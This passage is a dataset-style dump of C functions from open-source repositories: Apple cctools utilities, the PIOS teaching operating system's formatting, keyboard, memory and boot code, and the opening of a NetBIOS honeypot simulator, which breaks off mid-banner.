&&\n\t\t\t   (arch_flags[j].cpusubtype & ~CPU_SUBTYPE_MASK) ==\n\t\t\t\t(arch_flags[narch_flags].cpusubtype &\n\t\t\t\t ~CPU_SUBTYPE_MASK) &&\n\t\t\t   strcmp(arch_flags[j].name,\n\t\t\t\tarch_flags[narch_flags].name) == 0)\n\t\t\t    break;\n\t\t    }\n\t\t    if(j == narch_flags)\n\t\t\tnarch_flags++;\n\t\t}\n\t\ti++;\n\t\tcontinue;\n\t    }\n\t    if(strcmp(argv[i], \"-arch_indr\") == 0){\n\t\tif(list_filenames == NULL && narch_flags != 0)\n\t\t    fatal(\"can't mix -arch_indr and -arch arguments\");\n\t\tif(i + 2 >= argc){\n\t\t    error(\"missing argument(s) to %s option\", argv[i]);\n\t\t    usage();\n\t\t}\n\t\tarch_flags = reallocate(arch_flags,\n\t\t\t(narch_flags + 1) * sizeof(struct arch_flag));\n\t\tlist_filenames = reallocate(list_filenames,\n\t\t\t(narch_flags + 1) * sizeof(char *));\n\t\tif(get_arch_from_flag(argv[i+1],\n\t\t\t\t      arch_flags + narch_flags) == 0){\n\t\t    error(\"unknown architecture specification flag: \"\n\t\t\t  \"%s %s %s\", argv[i], argv[i+1], argv[i+2]);\n\t\t    arch_usage();\n\t\t    usage();\n\t\t}\n\t\tlist_filenames[narch_flags] = argv[i+2];\n\t\tfor(j = 0; j < narch_flags; j++){\n\t\t    if(arch_flags[j].cputype ==\n\t\t\t    arch_flags[narch_flags].cputype &&\n\t\t       (arch_flags[j].cpusubtype & ~CPU_SUBTYPE_MASK) ==\n\t\t\t    (arch_flags[narch_flags].cpusubtype & \n\t\t\t     ~CPU_SUBTYPE_MASK) &&\n\t\t       strcmp(arch_flags[j].name,\n\t\t\t    arch_flags[narch_flags].name) == 0)\n\t\t\tbreak;\n\t\t}\n\t\tif(j == narch_flags)\n\t\t    narch_flags++;\n\t\ti += 2;\n\t\tcontinue;\n\t    }\n\t    for(j = 1; argv[i][j] != '\\0'; j++){\n\t\tswitch(argv[i][j]){\n\t\tcase 'n':\n\t\t    nflag = TRUE;\n\t\t    break;\n\t\tdefault:\n\t\t    error(\"unknown flag -%c\", argv[i][j]);\n\t\t    usage();\n\t\t}\n\t    }\n\t}\n\tif((list_filename == NULL && list_filenames == NULL) ||\n\t   input_file == NULL || output_file == NULL)\n\t    usage();\n\n\t/*\n\t * Now do the work.\n\t */\n\n\t/* process the list of symbols and create the data structures */\n\tif(list_filenames == NULL)\n\t    process_list(list_filename, nflag);\n\n\t/* breakout the input file for processing */\n\tbreakout(input_file, &archs, &narchs, FALSE);\n\tif(errors)\n\t    exit(EXIT_FAILURE);\n\n\t/* checkout the input file for symbol table replacement processing */\n\tcheckout(archs, narchs);\n\n\t/* translate the symbols in the input file */\n\ttranslate_input(archs, narchs, arch_flags, narch_flags, all_archs,\n\t\t\tnflag);\n\tif(errors)\n\t    exit(EXIT_FAILURE);\n\n\t/* create the output file */\n\tif(stat(input_file, &stat_buf) == -1)\n\t    system_error(\"can't stat input file: %s\", input_file);\n\twriteout(archs, narchs, output_file, stat_buf.st_mode & 0777, TRUE,\n\t\t FALSE, FALSE, NULL);\n\n\tif(errors)\n\t    return(EXIT_FAILURE);\n\telse\n\t    return(EXIT_SUCCESS);\n}", "path": "cctools-750\\misc\\indr.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * This routine adds the specified string to the string table structure and\n * returns the index of the string in the table.\n */\n", "func_signal": "static\nint32_t\nadd_to_string_table(\nchar *p)", "code": "{\n    int32_t len, index;\n\n\tlen = strlen(p) + 1;\n\tif(string_table.size < string_table.index + len){\n\t    string_table.strings = (char *)reallocate(string_table.strings,\n\t\t\t\t\t\t      string_table.size * 2);\n\t    string_table.size *= 2;\n\t}\n\tindex = string_table.index;\n\tstrcpy(string_table.strings + string_table.index, p);\n\tstring_table.index += len;\n\treturn(index);\n}", "path": "cctools-750\\misc\\indr.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/* BYTE_SWAP */\n", "func_signal": "void\nmd_number_to_imm(\nunsigned char *buf,\nsigned_expr_t val,\nint n,\nfixS *fixP,\nint nsect)", "code": "{\n    uint32_t opcode;\n\n    if ( nsect == (int)text_nsect && (n % 4) != 0 )\n    \tas_warn(\"Immediate write of non-aligned data into text segment.\" );\n\t\n    if (nsect != (int)text_nsect ||\n\tfixP->fx_r_type == NO_RELOC ||\n\tfixP->fx_r_type == I860_RELOC_VANILLA)\n    {\n\tswitch (n) {\t/* Write out the data big-endian style. */\n\tcase 1:\n\t\t*buf = val;\n\t\tbreak;\n\tcase 2:\n\t\t*buf++ = (val>>8);\n\t\t*buf = val;\n\t\tbreak;\n\tcase 4:\n\t\t*buf++ = (val>>24);\n\t\t*buf++ = (val>>16);\n\t\t*buf++ = (val>>8);\n\t\t*buf = val;\n\t\tbreak;\n\tdefault:\n\t\tabort();\n\t}\n\treturn;\n    }\n\n    assert(n == 4);\t/* Better be an instruction with relocation data.... */\n    assert(fixP->fx_r_type < NO_RELOC && fixP->fx_r_type > I860_RELOC_VANILLA);\n    /*\n     * Here is where we do initial bit fiddling to load immediate \n     * values into the i860 bit fields.\n     */\n#ifdef BYTE_SWAP     \n    /* Note that all of these insns are ultimately little-endian */\n    /* Get the opcode from the buffer.  Less efficient, but more coherent... */\n    opcode = (buf[3] << 24) | (buf[2] << 16) | (buf[1] << 8) | buf[0];\n#else\n    opcode = (buf[0] << 24) | (buf[1] << 16) | (buf[2] << 8) | buf[3];\n#endif  \n    /* Apply the relocation value 'val' */\n    switch (fixP->fx_r_type) { \n    \tcase I860_RELOC_PAIR:\n\t\tas_warn(\"questionable relocation type I860_RELOC_PAIR\");\n\t\tbreak;\n    \tcase I860_RELOC_HIGH:\n\t\topcode &= ~0xFFFF;\n\t\topcode |= ((val >> 16) & 0xFFFF);\n\t\tbreak;\n    \tcase I860_RELOC_LOW0:\n\t\topcode &= ~0xFFFF;\n\t\topcode |= (val & 0xFFFF);\n\t\tbreak;\n    \tcase I860_RELOC_LOW1:\n\t\topcode &= 0xFFFF0001;\n\t\topcode |= (val & 0xFFFE);\t/* Bit 0 is an insn bit! */\n\t\tbreak;\n    \tcase I860_RELOC_LOW2:\n\t\topcode &= 0xFFFF0003;\n\t\topcode |= (val & 0xFFFC);\t/* Bits 0 and 1 are insn bits! */\n\t\tbreak;\n    \tcase I860_RELOC_LOW3:\n\t\topcode &= 0xFFFF0007;\n\t\topcode |= (val & 0xFFF8);\t/* Bits 0 thru 2 are insn bits! */\n\t\tbreak;\n    \tcase I860_RELOC_LOW4:\n\t\topcode &= 0xFFFF000F;\n\t\topcode |= (val & 0xFFF0);\t/* Bits 0 thru 3 are insn bits! */\n\t\tbreak;\n    \tcase I860_RELOC_SPLIT0:\n\t\topcode &= 0xFFE0F800;\n\t\tif ( fixP->fx_pcrel ) \t\t/* A 16 bit branch relative insn? */\n\t\t\tval >>= 2;\t\t/* Convert to word address */\n\t\topcode |= ((val & 0xF800) << 5) | (val & 0x7FF);\n\t\tbreak;\n    \tcase I860_RELOC_SPLIT1:\n\t\topcode &= 0xFFE0F801;\t\t/* Again, bit 0 is an insn bit! */\n\t\topcode |= ((val & 0xF800) << 5) | (val & 0x7FE);\n\t\tbreak;\n    \tcase I860_RELOC_SPLIT2:\n\t\topcode &= 0xFFE0F803;\t\t/* Bits 0 and 1 are insn bits! */\n\t\topcode |= ((val & 0xF800) << 5) | (val & 0x7FC);\n\t\tbreak;\n    \tcase I860_RELOC_HIGHADJ:\t\t\t/* Adjusted variant */\n\t\topcode &= ~0xFFFF;\n\t\t/* If the low half would be negative, compensate by adding 1 to \n\t\t * high half.\n\t\t */\n\t\tif ( (val & 0x8000) != 0 )\n\t\t\tval = (val >> 16) + 1;\n\t\telse\n\t\t\tval = (val >> 16);\n\t\topcode |= (val & 0xFFFF);\n\t\tbreak;\n    \tcase I860_RELOC_BRADDR:\n\t\tif ( fixP->fx_pcrel ) \t\t/* A 26 bit branch relative insn? */\n\t\t\tval >>= 2;\t\t/* Convert to word address */\n\t\topcode &= 0xFC000000;\n\t\topcode |= (val & 0x03FFFFFF);\n\t\tbreak;\n\t\n\tdefault:\n\t\tas_warn(\"bad relocation type: 0x%02x\", fixP->fx_r_type);\n\t\tbreak;\n\t}\n#ifdef BYTE_SWAP\n\tbuf[0] = opcode;\n\tbuf[1] = opcode >> 8;\n\tbuf[2] = opcode >> 16;\n\tbuf[3] = opcode >> 24;\n#else\n\tbuf[3] = opcode;\n\tbuf[2] = opcode >> 8;\n\tbuf[1] = opcode >> 16;\n\tbuf[0] = opcode >> 24;\n#endif\n\treturn;\n}", "path": "cctools-750\\as\\i860.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "// This is a function that we call when the kernel is \"done\" -\n// it just puts the processor into an infinite loop.\n// We make this a function so that we can set a breakpoints on it.\n// Our grade scripts use this breakpoint to know when to stop QEMU.\n", "func_signal": "void gcc_noreturn\ndone()", "code": "{\n\twhile (1)\n\t\t;\t// just spin\n}", "path": "kern\\init.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// This is the first function that gets run in user mode (ring 3).\n// It acts as PIOS's \"root process\",\n// of which all other processes are descendants.\n", "func_signal": "void\nuser()", "code": "{\n\tcprintf(\"in user()\\n\");\n\tassert(read_esp() > (uint32_t) &user_stack[0]);\n\tassert(read_esp() < (uint32_t) &user_stack[sizeof(user_stack)]);\n\n\t// Check that we're in user mode and can handle traps from there.\n\ttrap_check_user();\n\n\tdone();\n}", "path": "kern\\init.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Print a floating-point number in simple '%f' floating-point notation.\n", "func_signal": "static void\nputfloat(printstate *st, double num, int l10, int fmtch)", "code": "{\n\tchar buf[MAX(l10,0) + st->prec + 10], *p = buf;\t// big enough output buffer\n\tp = genfint(st, p, num);\t\t\t// sign and integer part\n\tp = genfrac(st, p, num, fmtch);\t\t\t// '.' and fractional part\n\tputstr(st, buf, p-buf);\t\t\t\t// print it with padding\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Print a floating-point number in exponential '%e' notation.\n", "func_signal": "static void\nputflexp(printstate *st, double num, int l10, int fmtch)", "code": "{\n\tnum *= pow(10, -l10);\t\t\t// shift num to correct position\n\n\tchar buf[st->prec + 20], *p = buf;\t// big enough output buffer\n\tp = genfint(st, p, num);\t\t// generate sign and integer part\n\tp = genfrac(st, p, num, fmtch);\t\t// generate '.' and fractional part\n\n\t*p++ = isupper(fmtch) ? 'E' : 'e';\t// generate exponent\n\tst->signc = '+';\n\tif (l10 < 0)\n\t\tl10 = -l10, st->signc = '-';\n\tp = genint(st, p, l10 / 10);\t\t// at least 2 digits\n\t*p++ = '0' + l10 % 10;\n\n\tputstr(st, buf, p-buf);\t\t\t// print it all with field padding\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "/*\n * Get data from the keyboard.  If we finish a character, return it.  Else 0.\n * Return -1 if no data.\n */\n", "func_signal": "static int\nkbd_proc_data(void)", "code": "{\n\tint c;\n\tuint8_t data;\n\tstatic uint32_t shift;\n\n\tif ((inb(KBSTATP) & KBS_DIB) == 0)\n\t\treturn -1;\n\n\tdata = inb(KBDATAP);\n\n\tif (data == 0xE0) {\n\t\t// E0 escape character\n\t\tshift |= E0ESC;\n\t\treturn 0;\n\t} else if (data & 0x80) {\n\t\t// Key released\n\t\tdata = (shift & E0ESC ? data : data & 0x7F);\n\t\tshift &= ~(shiftcode[data] | E0ESC);\n\t\treturn 0;\n\t} else if (shift & E0ESC) {\n\t\t// Last character was an E0 escape; or with 0x80\n\t\tdata |= 0x80;\n\t\tshift &= ~E0ESC;\n\t}\n\n\tshift |= shiftcode[data];\n\tshift ^= togglecode[data];\n\n\tc = charcode[shift & (CTL | SHIFT)][data];\n\tif (shift & CAPSLOCK) {\n\t\tif ('a' <= c && c <= 'z')\n\t\t\tc += 'A' - 'a';\n\t\telse if ('A' <= c && c <= 'Z')\n\t\t\tc += 'a' - 'A';\n\t}\n\n\t// Process special keys\n\t// Ctrl-Alt-Del: reboot\n\tif (!(~shift & (CTL | ALT)) && c == KEY_DEL) {\n\t\tcprintf(\"Rebooting!\\n\");\n\t\toutb(0x92, 0x3); // courtesy of Chris Frost\n\t}\n\n\treturn c;\n}", "path": "dev\\kbd.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Print a floating-point number in general '%g' notation.\n", "func_signal": "static void\nputflgen(printstate *st, double num, int l10, int fmtch)", "code": "{\n\t// The precision in the format string counts significant figures.\n\tint sigfigs = (st->prec < 0) ? 6 : (st->prec == 0) ? 1 : st->prec;\n\tif (l10 < -4 || l10 >= st->prec) {\t// Use exponential notation\n\t\tst->prec = sigfigs-1;\n\t\tputflexp(st, num, l10, fmtch);\n\t} else {\t\t\t\t// Use simple decimal notation\n\t\tst->prec -= l10 + 1;\n\t\tputfloat(st, num, l10, fmtch);\n\t}\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Print padding characters, and an optional sign before a number.\n", "func_signal": "static void\nputpad(printstate *st)", "code": "{\n\twhile (--st->width >= 0)\n\t\tst->putch(st->padc, st->putdat);\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Get an unsigned int of various possible sizes from a varargs list,\n// depending on the lflag parameter.\n", "func_signal": "static uintmax_t\ngetuint(printstate *st, va_list *ap)", "code": "{\n\tif (st->flags & F_LL)\n\t\treturn va_arg(*ap, unsigned long long);\n\telse if (st->flags & F_L)\n\t\treturn va_arg(*ap, unsigned long);\n\telse\n\t\treturn va_arg(*ap, unsigned int);\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Main function to format and print a string.\n", "func_signal": "void\nvprintfmt(void (*putch)(int, void*), void *putdat, const char *fmt, va_list ap)", "code": "{\n\tregister int ch, err;\n\n\tprintstate st = { .putch = putch, .putdat = putdat };\n\twhile (1) {\n\t\twhile ((ch = *(unsigned char *) fmt++) != '%') {\n\t\t\tif (ch == '\\0')\n\t\t\t\treturn;\n\t\t\tputch(ch, putdat);\n\t\t}\n\n\t\t// Process a %-escape sequence\n\t\tst.padc = ' ';\n\t\tst.width = -1;\n\t\tst.prec = -1;\n\t\tst.signc = -1;\n\t\tst.flags = 0;\n\t\tst.base = 10;\n\t\tuintmax_t num;\n\treswitch:\n\t\tswitch (ch = *(unsigned char *) fmt++) {\n\n\t\t// modifier flags\n\t\tcase '-': // pad on the right instead of the left\n\t\t\tst.flags |= F_RPAD;\n\t\t\tgoto reswitch;\n\n\t\tcase '+': // prefix positive numeric values with a '+' sign\n\t\t\tst.signc = '+';\n\t\t\tgoto reswitch;\n\n\t\tcase ' ': // prefix signless numeric values with a space\n\t\t\tif (st.signc < 0)\t// (but only if no '+' is specified)\n\t\t\t\tst.signc = ' ';\n\t\t\tgoto reswitch;\n\n\t\t// width or precision field\n\t\tcase '0':\n\t\t\tif (!(st.flags & F_DOT))\n\t\t\t\tst.padc = '0'; // pad with 0's instead of spaces\n\t\tcase '1': case '2': case '3': case '4':\n\t\tcase '5': case '6': case '7': case '8': case '9':\n\t\t\tfor (st.prec = 0; ; ++fmt) {\n\t\t\t\tst.prec = st.prec * 10 + ch - '0';\n\t\t\t\tch = *fmt;\n\t\t\t\tif (ch < '0' || ch > '9')\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tgoto gotprec;\n\n\t\tcase '*':\n\t\t\tst.prec = va_arg(ap, int);\n\t\tgotprec:\n\t\t\tif (!(st.flags & F_DOT)) {\t// haven't seen a '.' yet?\n\t\t\t\tst.width = st.prec;\t// then it's a field width\n\t\t\t\tst.prec = -1;\n\t\t\t}\n\t\t\tgoto reswitch;\n\n\t\tcase '.':\n\t\t\tst.flags |= F_DOT;\n\t\t\tgoto reswitch;\n\n\t\tcase '#':\n\t\t\tst.flags |= F_ALT;\n\t\t\tgoto reswitch;\n\n\t\t// long flag (doubled for long long)\n\t\tcase 'l':\n\t\t\tst.flags |= (st.flags & F_L) ? F_LL : F_L;\n\t\t\tgoto reswitch;\n\n\t\t// character\n\t\tcase 'c':\n\t\t\tputch(va_arg(ap, int), putdat);\n\t\t\tbreak;\n\n\t\t// string\n\t\tcase 's': {\n\t\t\tconst char *s;\n\t\t\tif ((s = va_arg(ap, char *)) == NULL)\n\t\t\t\ts = \"(null)\";\n\t\t\tputstr(&st, s, st.prec);\n\t\t\tbreak;\n\t\t    }\n\n\t\t// (signed) decimal\n\t\tcase 'd':\n\t\t\tnum = getint(&st, &ap);\n\t\t\tif ((intmax_t) num < 0) {\n\t\t\t\tnum = -(intmax_t) num;\n\t\t\t\tst.signc = '-';\n\t\t\t}\n\t\t\tputint(&st, num, 10);\n\t\t\tbreak;\n\n\t\t// unsigned decimal\n\t\tcase 'u':\n\t\t\tputint(&st, getuint(&st, &ap), 10);\n\t\t\tbreak;\n\n\t\t// (unsigned) octal\n\t\tcase 'o':\n\t\t\t// Replace this with your code.\n\t\t\tputch('X', putdat);\n\t\t\tputch('X', putdat);\n\t\t\tputch('X', putdat);\n\t\t\tbreak;\n\n\t\t// (unsigned) hexadecimal\n\t\tcase 'x':\n\t\t\tputint(&st, getuint(&st, &ap), 16);\n\t\t\tbreak;\n\n\t\t// pointer\n\t\tcase 'p':\n\t\t\tputch('0', putdat);\n\t\t\tputch('x', putdat);\n\t\t\tputint(&st, (uintptr_t) va_arg(ap, void *), 16);\n\t\t\tbreak;\n\n#ifndef PIOS_KERNEL\n\t\t// floating-point\n\t\tcase 'f': case 'F':\n\t\tcase 'e': case 'E':\t// XXX should be different from %f\n\t\tcase 'g': case 'G': {\t// XXX should be different from %f\n\t\t\tint variant = tolower(ch);\t// which format variant?\n\t\t\tdouble val = va_arg(ap, double);\t// number to print\n\t\t\tif (val < 0) {\t\t\t// handle the sign\n\t\t\t\tval = -val;\n\t\t\t\tst.signc = '-';\n\t\t\t}\n\t\t\tif (isinf(val))\t\t\t// handle infinities\n\t\t\t\tputfinf(&st, isupper(ch) ? \"INF\" : \"inf\");\n\t\t\telse if (isnan(val))\t\t// handle NANs\n\t\t\t\tputfinf(&st, isupper(ch) ? \"NAN\" : \"nan\");\n\t\t\telse if (variant == 'f')\t// simple decimal format\n\t\t\t\tputfloat(&st, val, floor(log10(val)), ch);\n\t\t\telse if (variant == 'e')\t// exponential format\n\t\t\t\tputflexp(&st, val, floor(log10(val)), ch);\n\t\t\telse if (variant == 'g')\t// general/mixed format\n\t\t\t\tputflgen(&st, val, floor(log10(val)), ch);\n\t\t\tbreak;\n\t\t    }\n#endif\t// ! PIOS_KERNEL\n\n\t\t// escaped '%' character\n\t\tcase '%':\n\t\t\tputch(ch, putdat);\n\t\t\tbreak;\n\n\t\t// unrecognized escape sequence - just print it literally\n\t\tdefault:\n\t\t\tputch('%', putdat);\n\t\t\tfor (fmt--; fmt[-1] != '%'; fmt--)\n\t\t\t\t/* do nothing */;\n\t\t\tbreak;\n\t\t}\n\t}\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Print a floating point infinity or NaN\n", "func_signal": "static void\nputfinf(printstate *st, const char *str)", "code": "{\n\tchar buf[10], *p = buf;\n\tif (st->signc >= 0)\n\t\t*p++ = st->signc;\t\t// leading sign\n\tstrcpy(p, str);\n\tputstr(st, buf, -1);\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "//\n// Check the physical page allocator (mem_alloc(), mem_free())\n// for correct operation after initialization via mem_init().\n//\n", "func_signal": "void\nmem_check()", "code": "{\n\tpageinfo *pp, *pp0, *pp1, *pp2;\n\tpageinfo *fl;\n\tint i;\n\n        // if there's a page that shouldn't be on\n        // the free list, try to make sure it\n        // eventually causes trouble.\n\tint freepages = 0;\n\tfor (pp = mem_freelist; pp != 0; pp = pp->free_next) {\n\t\tmemset(mem_pi2ptr(pp), 0x97, 128);\n\t\tfreepages++;\n\t}\n\tcprintf(\"mem_check: %d free pages\\n\", freepages);\n\tassert(freepages < mem_npage);\t// can't have more free than total!\n\tassert(freepages > 16000);\t// make sure it's in the right ballpark\n\n\t// should be able to allocate three pages\n\tpp0 = pp1 = pp2 = 0;\n\tpp0 = mem_alloc(); assert(pp0 != 0);\n\tpp1 = mem_alloc(); assert(pp1 != 0);\n\tpp2 = mem_alloc(); assert(pp2 != 0);\n\n\tassert(pp0);\n\tassert(pp1 && pp1 != pp0);\n\tassert(pp2 && pp2 != pp1 && pp2 != pp0);\n        assert(mem_pi2phys(pp0) < mem_npage*PAGESIZE);\n        assert(mem_pi2phys(pp1) < mem_npage*PAGESIZE);\n        assert(mem_pi2phys(pp2) < mem_npage*PAGESIZE);\n\n\t// temporarily steal the rest of the free pages\n\tfl = mem_freelist;\n\tmem_freelist = 0;\n\n\t// should be no free memory\n\tassert(mem_alloc() == 0);\n\n        // free and re-allocate?\n        mem_free(pp0);\n        mem_free(pp1);\n        mem_free(pp2);\n\tpp0 = pp1 = pp2 = 0;\n\tpp0 = mem_alloc(); assert(pp0 != 0);\n\tpp1 = mem_alloc(); assert(pp1 != 0);\n\tpp2 = mem_alloc(); assert(pp2 != 0);\n\tassert(pp0);\n\tassert(pp1 && pp1 != pp0);\n\tassert(pp2 && pp2 != pp1 && pp2 != pp0);\n\tassert(mem_alloc() == 0);\n\n\t// give free list back\n\tmem_freelist = fl;\n\n\t// free the pages we took\n\tmem_free(pp0);\n\tmem_free(pp1);\n\tmem_free(pp2);\n\n\tcprintf(\"mem_check() succeeded!\\n\");\n}", "path": "kern\\mem.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Read 'count' bytes at 'offset' from kernel into virtual address 'va'.\n// Might copy more than asked\n", "func_signal": "void\nreadseg(uint32_t va, uint32_t count, uint32_t offset)", "code": "{\n\tuint32_t end_va;\n\n\tva &= 0xFFFFFF;\n\tend_va = va + count;\n\t\n\t// round down to sector boundary\n\tva &= ~(SECTSIZE - 1);\n\n\t// translate from bytes to sectors, and kernel starts at sector 1\n\toffset = (offset / SECTSIZE) + 1;\n\n\t// If this is too slow, we could read lots of sectors at a time.\n\t// We'd write more to memory than asked, but it doesn't matter --\n\t// we load in increasing order.\n\twhile (va < end_va) {\n\t\treadsect((uint8_t*) va, offset);\n\t\tva += SECTSIZE;\n\t\toffset++;\n\t}\n}", "path": "boot\\main.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Stupid I/O delay routine necessitated by historical PC design flaws\n", "func_signal": "static void\ndelay(void)", "code": "{\n\tinb(0x84);\n\tinb(0x84);\n\tinb(0x84);\n\tinb(0x84);\n}", "path": "dev\\serial.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// the kernel doesn't need or want floating-point\n// Print the integer part of a floating-point number\n", "func_signal": "static char *\ngenfint(printstate *st, char *p, double num)", "code": "{\n\tif (num >= 10.0)\n\t\tp = genfint(st, p, num / 10.0);\t// recursively print higher digits\n\telse if (st->signc >= 0)\n\t\t*p++ = st->signc;\t\t// optional sign before first digit\n\t*p++ = '0' + (int)fmod(num, 10.0);\t// output this digit\n\treturn p;\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Return a pointer to the first occurrence of 'c' in 's',\n// or a null pointer if the string has no 'c'.\n", "func_signal": "char *\nstrchr(const char *s, char c)", "code": "{\n\twhile (*s != c)\n\t\tif (*s++ == 0)\n\t\t\treturn NULL;\n\treturn (char *) s;\n}", "path": "lib\\string.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Generate a number (base <= 16) in reverse order into a string buffer.\n", "func_signal": "static char *\ngenint(printstate *st, char *p, uintmax_t num)", "code": "{\n\t// first recursively print all preceding (more significant) digits\n\tif (num >= st->base)\n\t\tp = genint(st, p, num / st->base);\t// output higher digits\n\telse if (st->signc >= 0)\n\t\t*p++ = st->signc;\t\t\t// output leading sign\n\t*p++ = \"0123456789abcdef\"[num % st->base];\t// output this digit\n\treturn p;\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Called first from entry.S on the bootstrap processor,\n// and later from boot/bootother.S on all other processors.\n// As a rule, \"init\" functions in PIOS are called once on EACH processor.\n", "func_signal": "void\ninit(void)", "code": "{\n\textern char start[], edata[], end[];\n\n\t// Before anything else, complete the ELF loading process.\n\t// Clear all uninitialized global data (BSS) in our program,\n\t// ensuring that all static/global variables start out zero.\n\tif (cpu_onboot())\n\t\tmemset(edata, 0, end - edata);\n\n\t// Initialize the console.\n\t// Can't call cprintf until after we do this!\n\tcons_init();\n\n\t// Lab 1: test cprintf and debug_trace\n\tcprintf(\"1234 decimal is %o octal!\\n\", 1234);\n\tdebug_check();\n\n\t// Initialize and load the bootstrap CPU's GDT, TSS, and IDT.\n\tcpu_init();\n\ttrap_init();\n\n\t// Physical memory detection/initialization.\n\t// Can't call mem_alloc until after we do this!\n\tmem_init();\n\n\n\t// Lab 1: change this so it enters user() in user mode,\n\t// running on the user_stack declared above,\n\t// instead of just calling user() directly.\n\tuser();\n}", "path": "kern\\init.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Same as getuint but signed - can't use getuint\n// because of sign extension\n", "func_signal": "static intmax_t\ngetint(printstate *st, va_list *ap)", "code": "{\n\tif (st->flags & F_LL)\n\t\treturn va_arg(*ap, long long);\n\telse if (st->flags & F_L)\n\t\treturn va_arg(*ap, long);\n\telse\n\t\treturn va_arg(*ap, int);\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Print an integer with any appropriate field padding.\n", "func_signal": "static void\nputint(printstate *st, uintmax_t num, int base)", "code": "{\n\tchar buf[30], *p = buf;\t\t// big enough for any 64-bit int in octal\n\tst->base = base;\t\t// select base for genint\n\tp = genint(st, p, num);\t\t// output to the string buffer\n\tputstr(st, buf, p-buf);\t\t// print it with left/right padding\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "// Print a string with a specified maximum length (-1=unlimited),\n// with any appropriate left or right field padding.\n", "func_signal": "static void\nputstr(printstate *st, const char *str, int maxlen)", "code": "{\n\tconst char *lim;\t\t// find where the string actually ends\n\tif (maxlen < 0)\n\t\tlim = strchr(str, 0);\t// find the terminating null\n\telse if ((lim = memchr(str, 0, maxlen)) == NULL)\n\t\tlim = str + maxlen;\n\tst->width -= (lim-str);\t\t// deduct string length from field width\n\n\tif (!(st->flags & F_RPAD))\t// print left-side padding\n\t\tputpad(st);\t\t// (also leaves st->width == 0)\n\twhile (str < lim) {\n\t\tchar ch = *str++;\n\t\t\tst->putch(ch, st->putdat);\n\t}\n\tputpad(st);\t\t\t// print right-side padding\n}", "path": "lib\\printfmt.c", "repo_name": "bford/PIOS", "stars": 34, "license": "None", "language": "c", "size": 301}
{"docstring": "/* Host name resolve */\n", "func_signal": "unsigned long resolve(char *name)", "code": "{\n    struct hostent *he;\n    unsigned int ip;\n\n    if((ip=inet_addr(name))==(-1))\n    {\n        if((he=gethostbyname(name))==0)\n            return 0;\n        memcpy(&ip,he->h_addr,4);\n    }\n    return ip;\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Main */\n", "func_signal": "int main(int argc,char *argv[])", "code": "{\n#ifdef WIN32\n\tWSADATA wsd;\t// Winsock Data\n#endif\n\tint c;\t// command line switches\n\tint showusage = 0;\n\tint verbose_on = 0;\n\tint honeyd_mode = 0;\n\tint conffile_mode = 0;\n\tFILE *fp;\t\t\t\t// config file\n\tchar *confpath;\n\tchar *tmpbuf = malloc(320);\n\tunsigned long int line_count = 0;\n\tchar domains[1000][14];\t// config params\n\tchar hosts[1000][14];\n\tchar ipaddr[1000][15];\n\tchar desc[1000][256];\n\tint ann_type[1000];\n\n\tint raw_ip_on = 1;\n    long int hostcount;\n\tint numlong = 1;\n\tchar namemask[5];\n\tint timerset = 0;\n\tint rnddelay = 0;\t\t// Pseudo-random delay between 2 announcements (ms)\n\tint meandelay = 500;\t// Mean delay\n\tint announce_type = 1;\n\tnbt_header nbt_hdr;\t\t// NetBIOS structures\n\tsmb_header smb_hdr;\n\tbrowser_announcement announcement;\n\tchar sendbuf[512];\n\tint bufLen;\n\tlong int init_rnd;\n\tunsigned long int i;\n\n\t/* Program header */\n    printf(\"\\n-----------\\n\");\n    printf(\"%s V.0.9\\n\", appname);\n    printf(\"Patrick Chambet - patrick@chambet.com\\n\");\n\tprintf(\"Simulation of NetBIOS hosts (Windows-like) on NetBIOS Datagram Service (DGM)\\n\");\n\tprintf(\"Honeyd subsystem or standalone app mode\\n\");\n\tprintf(\"This is provided as a simulation tool only for educational 